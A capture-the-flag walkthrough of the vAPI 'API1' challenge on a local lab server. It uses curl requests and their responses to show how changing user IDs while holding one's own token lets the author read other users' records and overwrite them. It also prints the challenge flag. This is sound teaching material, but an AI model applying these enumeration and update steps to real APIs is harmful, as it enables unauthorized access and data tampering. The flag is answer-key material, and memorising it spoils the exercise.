# Broken Object Level Authorization
> You can register yourself as a User , Thats it ....or is there something more?

Note: Insecure Direct Object Reference (IDOR) and Broken Object Level Authorization (BOLA) are the same findings under a different name.

# Tools Used:
```
curl 8.8.0 (x86_64-pc-linux-gnu)
base64 (GNU coreutils) 9.4
echo (GNU coreutils) 9.4
```

# Create User
## POST /vapi/api1/user

Create a user.
```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' -H $'Accept: application/json' -H $'Host: localhost' \
    --data-binary $'{\x0d\x0a    \"username\": \"testuser1\",\x0d\x0a    \"name\": \"testname1\",\x0d\x0a    \"course\": \"testcourse1\",\x0d\x0a    \"password\": \"testpass1\"\x0d\x0a}' \
    $'http://localhost/vapi/api1/user'
```

A "201 Created" response should be received after sending the request.
```http
HTTP/1.1 201 Created
Host: localhost
Date: Tue, 25 Jun 2024 18:59:40 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Tue, 25 Jun 2024 18:59:40 GMT
Content-Type: application/json

{"username":"testuser1","name":"testname1","course":"testcourse1","id":16}
```

As specified in the Postman Collection, the test script to be executed for the API1 Create User endpoint is used to derive the User ID (id) and the Authentication Token (Authorization-Token) to be updated in the Postman Environment as api1_id and api1_auth respectively.
```js
var jsonData = JSON.parse(responseBody);
var api1_id = jsonData.id;
console.log("API 1 User ID : "+api1_id);
postman.setEnvironmentVariable("api1_id",api1_id);
var reqData = JSON.parse(request.data);
var api1_username=reqData.username;
var api1_password=reqData.password;
var api1_auth=btoa(api1_username+":"+api1_password);
console.log("API 1 Auth : "+api1_auth);
postman.setEnvironmentVariable("api1_auth",api1_auth);
```

We can derive the User ID (id) of our newly created user from the response:
```
16
```

We can derive the Authentication Token (Authorization-Token) of our newly created user:
```bash
echo -n "testuser1:testpass1" | base64
```
```
dGVzdHVzZXIxOnRlc3RwYXNzMQ==
```
- We will need this Authentication Token for the "Get User" endpoint

# Get User
## GET /vapi/api1/user/{api1_id}

Get information of our newly created user, using our own User ID and our own Authorization Token
```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Authorization-Token: dGVzdHVzZXIxOnRlc3RwYXNzMQ==' -H $'Host: localhost' \
    $'http://localhost/vapi/api1/user/16'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Tue, 25 Jun 2024 19:40:27 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Tue, 25 Jun 2024 19:40:27 GMT
Content-Type: application/json

{"id":16,"username":"testuser1","name":"testname1","course":"testcourse1"}
```

Lets attempt to check if we can access information of other users, using other User IDs, while using our own Authorization Token
```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Authorization-Token: dGVzdHVzZXIxOnRlc3RwYXNzMQ==' -H $'Host: localhost' \
    $'http://localhost/vapi/api1/user/2'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Tue, 25 Jun 2024 19:43:34 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Tue, 25 Jun 2024 19:43:34 GMT
Content-Type: application/json

{"id":2,"username":"meredithp","name":"Meredith Palmer","course":"The Subtle art of not giving a F***"}
```

Seems like we are able to access other user's data with our own Authorization Token. This is not supposed to happen, and shows that Broken Object Level Authorization (BOLA) exists.

After enumerating, we find the flag with an User ID of 1:
```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Authorization-Token: dGVzdHVzZXIxOnRlc3RwYXNzMQ==' -H $'Host: localhost' \
    $'http://localhost/vapi/api1/user/1'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Tue, 25 Jun 2024 19:46:18 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Tue, 25 Jun 2024 19:46:18 GMT
Content-Type: application/json

{"id":1,"username":"michaels","name":"Michael Scott","course":"flag{api1_d0cd9be2324cc237235b}"}
```

API1 Flag
```
flag{api1_d0cd9be2324cc237235b}
```

# Update User
## PUT /vapi/api1/user/{api1_id}

It seems like we can also access information of other users, using other User IDs, while using our own Authorization Token with the Update User endpoint.
```bash
curl --path-as-is -i -s -k -X $'PUT' \
    -H $'Authorization-Token: dGVzdHVzZXIxOnRlc3RwYXNzMQ==' -H $'Host: localhost' \
    $'http://localhost/vapi/api1/user/4'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Tue, 25 Jun 2024 19:55:28 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Tue, 25 Jun 2024 19:55:28 GMT
Content-Type: application/json

{"id":4,"username":"jimhalp","name":"Jim Halpert","course":"Art of Pranks"}
```

Data of other users can be updated while using our own Authorization Token.
```
curl --path-as-is -i -s -k -X $'PUT' \
    -H $'Authorization-Token: dGVzdHVzZXIxOnRlc3RwYXNzMQ==' -H $'Host: localhost' -H $'Content-Type: application/json' \
    --data-binary $'{\x0d\x0a  \"username\": \"updated_user\",\x0d\x0a  \"name\": \"updated_name\",\x0d\x0a  \"course\": \"updated_course\",\x0d\x0a  \"password\": \"updated_pass\"\x0d\x0a}' \
    $'http://localhost/vapi/api1/user/4'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Tue, 25 Jun 2024 19:59:24 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Tue, 25 Jun 2024 19:59:24 GMT
Content-Type: application/json

{"id":4,"username":"updated_user","name":"updated_name","course":"updated_course"}
```
- Observe that the User ID of "4" used to have the name "Jim Halpert" but has been updated to "updated_name".

References:
https://www.traceable.ai/blog-post/a-deep-dive-on-the-most-critical-api-vulnerability-bola-broken-object-level-authorization
https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
https://owasp.org/API-Security/editions/2019/en/0xa1-broken-object-level-authorization/
